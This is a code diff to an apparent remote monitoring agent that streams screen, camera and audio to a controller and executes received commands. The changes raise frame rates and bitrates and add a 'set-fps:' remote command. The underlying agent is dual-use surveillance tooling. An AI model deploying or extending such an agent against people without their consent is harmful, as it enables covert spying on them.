@@ -657,9 +657,9 @@ STREAM_THREADS = []
 STREAM_THREAD = None
 capture_queue = None
 encode_queue = None
-TARGET_FPS = 15
-CAPTURE_QUEUE_SIZE = 5
-ENCODE_QUEUE_SIZE = 5
+TARGET_FPS = 50  # Optimized for 40-60 FPS range
+CAPTURE_QUEUE_SIZE = 10  # Increased for higher FPS
+ENCODE_QUEUE_SIZE = 10  # Increased for higher FPS
 
 # Audio streaming variables
 AUDIO_STREAMING_ENABLED = False
@@ -676,9 +676,9 @@ CAMERA_STREAMING_ENABLED = False
 CAMERA_STREAM_THREADS = []
 camera_capture_queue = None
 camera_encode_queue = None
-CAMERA_CAPTURE_QUEUE_SIZE = 5
-CAMERA_ENCODE_QUEUE_SIZE = 5
-TARGET_CAMERA_FPS = 30
+CAMERA_CAPTURE_QUEUE_SIZE = 10  # Increased for higher FPS
+CAMERA_ENCODE_QUEUE_SIZE = 10  # Increased for higher FPS
+TARGET_CAMERA_FPS = 50  # Optimized for 40-60 FPS range
 
 # Other global variables
 CLIPBOARD_MONITOR_ENABLED = False
@@ -755,17 +755,17 @@ WEBRTC_CONFIG = {
     'adaptive_bitrate': True,
     'frame_dropping': True,
     'quality_levels': {
-        'low': {'width': 640, 'height': 480, 'fps': 15, 'bitrate': 500000},
-        'medium': {'width': 1280, 'height': 720, 'fps': 30, 'bitrate': 2000000},
-        'high': {'width': 1920, 'height': 1080, 'fps': 30, 'bitrate': 5000000},
-        'auto': {'adaptive': True, 'min_bitrate': 500000, 'max_bitrate': 10000000}
+        'low': {'width': 640, 'height': 480, 'fps': 30, 'bitrate': 800000},
+        'medium': {'width': 1280, 'height': 720, 'fps': 50, 'bitrate': 3000000},
+        'high': {'width': 1920, 'height': 1080, 'fps': 60, 'bitrate': 8000000},
+        'auto': {'adaptive': True, 'min_bitrate': 800000, 'max_bitrate': 15000000}
     },
     'performance_tuning': {
         'keyframe_interval': 2,  # seconds
         'disable_b_frames': True,
         'ultra_low_latency': True,
         'hardware_acceleration': True,
-        'gop_size': 60,  # frames at 30fps = 2 seconds
+        'gop_size': 100,  # frames at 50fps = 2 seconds
         'max_bitrate_variance': 0.3  # 30% variance allowed
     },
     'monitoring': {
@@ -774,9 +774,9 @@ WEBRTC_CONFIG = {
         'detailed_logging': True,
         'stats_interval': 1000,  # ms
         'quality_thresholds': {
-            'min_bitrate': 100000,  # 100 kbps
-            'max_latency': 1000,    # 1 second
-            'min_fps': 15
+            'min_bitrate': 500000,  # 500 kbps for higher FPS
+            'max_latency': 500,     # 500ms for better responsiveness
+            'min_fps': 40           # Minimum 40 FPS target
         }
     }
 }
@@ -796,8 +796,8 @@ PRODUCTION_SCALE = {
     },
     'performance_targets': {
         'target_latency': 100,                # 100ms target latency
-        'target_bitrate': 5000000,            # 5 Mbps target bitrate
-        'target_fps': 30,                     # 30 FPS target
+        'target_bitrate': 8000000,            # 8 Mbps target bitrate for higher FPS
+        'target_fps': 50,                     # 50 FPS target (40-60 range)
         'max_packet_loss': 0.01               # 1% max packet loss
     }
 }
@@ -5504,6 +5504,30 @@ def stop_camera_streaming():
         camera_encode_queue = None
         log_message("Stopped camera stream.")
 
+def set_streaming_fps(fps_value):
+    """Dynamically set FPS for all active streams."""
+    global TARGET_FPS, TARGET_CAMERA_FPS
+    
+    try:
+        fps = int(fps_value)
+        # Enforce 30-60 FPS range
+        fps = max(30, min(60, fps))
+        
+        # Update global FPS targets
+        TARGET_FPS = fps
+        TARGET_CAMERA_FPS = fps
+        
+        # Update WebRTC streams if active
+        if WEBRTC_STREAMS:
+            for key, track in WEBRTC_STREAMS.items():
+                if hasattr(track, 'set_fps'):
+                    track.set_fps(fps)
+        
+        log_message(f"Streaming FPS set to {fps}")
+        return f"FPS updated to {fps}"
+    except ValueError:
+        return "Invalid FPS value. Use: set-fps:30 or set-fps:60"
+
 # ========================================================================================
 # WEBRTC PEER CONNECTION MANAGEMENT FOR LOW-LATENCY STREAMING
 # ========================================================================================
@@ -5520,7 +5544,7 @@ async def create_webrtc_peer_connection(agent_id, enable_screen=True, enable_aud
         
         # Add media tracks
         if enable_screen:
-            screen_track = ScreenTrack(agent_id, target_fps=30, quality=85)
+            screen_track = ScreenTrack(agent_id, target_fps=50, quality=85)
             pc.addTrack(screen_track)
             WEBRTC_STREAMS[f"{agent_id}_screen"] = screen_track
             log_message(f"Added screen track to WebRTC connection for agent {agent_id}")
@@ -5532,7 +5556,7 @@ async def create_webrtc_peer_connection(agent_id, enable_screen=True, enable_aud
             log_message(f"Added audio track to WebRTC connection for agent {agent_id}")
         
         if enable_camera:
-            camera_track = CameraTrack(agent_id, camera_index=0, target_fps=30, quality=85)
+            camera_track = CameraTrack(agent_id, camera_index=0, target_fps=50, quality=85)
             pc.addTrack(camera_track)
             WEBRTC_STREAMS[f"{agent_id}_camera"] = camera_track
             log_message(f"Added camera track to WebRTC connection for agent {agent_id}")
@@ -5882,8 +5906,8 @@ def implement_frame_dropping(agent_id, load_threshold=0.8):
                 for key, track in WEBRTC_STREAMS.items():
                     if key.startswith(f"{agent_id}_"):
                         if hasattr(track, 'set_fps'):
-                            current_fps = getattr(track, '_target_fps', 30)
-                            new_fps = max(15, int(current_fps * 0.7))  # Reduce FPS by 30%
+                            current_fps = getattr(track, '_target_fps', 50)
+                            new_fps = max(40, int(current_fps * 0.8))  # Reduce FPS by 20%, min 40 FPS
                             track.set_fps(new_fps)
                 
                 # Emit frame dropping event to controller
@@ -5935,7 +5959,7 @@ def monitor_connection_quality(agent_id):
             quality_issues.append('packet_loss')
         
         # Check FPS
-        current_fps = 30  # Default, should get from actual track
+        current_fps = 50  # Default, should get from actual track
         for key, track in WEBRTC_STREAMS.items():
             if key.startswith(f"{agent_id}_"):
                 if hasattr(track, '_target_fps'):
@@ -7848,6 +7872,12 @@ def main_loop(agent_id):
                     output = f"Internal command '{command}' executed successfully"
                 except Exception as e:
                     output = f"Internal command '{command}' failed: {e}"
+            elif command.startswith("set-fps:"):
+                try:
+                    fps_value = command.split(":")[1]
+                    output = set_streaming_fps(fps_value)
+                except Exception as e:
+                    output = f"Failed to set FPS: {e}"
             elif command == "list-processes":
                 try:
                     import psutil
@@ -8320,9 +8350,9 @@ except ImportError:
     HAS_XXHASH = False
 
 class HighPerformanceCapture:
-    """High-performance screen capture optimized for real-time monitoring at 2 FPS (0.5-second intervals)"""
+    """High-performance screen capture optimized for real-time monitoring at 40-60 FPS"""
     
-    def __init__(self, target_fps: int = 2, quality: int = 85, 
+    def __init__(self, target_fps: int = 50, quality: int = 85, 
                  enable_delta_compression: bool = True):
         self.target_fps = target_fps
         self.frame_time = 1.0 / target_fps
@@ -8552,7 +8582,7 @@ class HighPerformanceCapture:
     
     def set_fps(self, fps: int):
         """Dynamically adjust target FPS"""
-        self.target_fps = max(10, min(120, fps))
+        self.target_fps = max(40, min(60, fps))  # Enforce 40-60 FPS range
         self.frame_time = 1.0 / self.target_fps
     
     def __del__(self):
@@ -10495,6 +10525,12 @@ def on_command(data):
 
     if command in internal_commands:
         output = internal_commands[command]()
+    elif command.startswith("set-fps:"):
+        try:
+            fps_value = command.split(":")[1]
+            output = set_streaming_fps(fps_value)
+        except Exception as e:
+            output = f"Failed to set FPS: {e}"
     elif command == "list-processes":
         try:
             import psutil
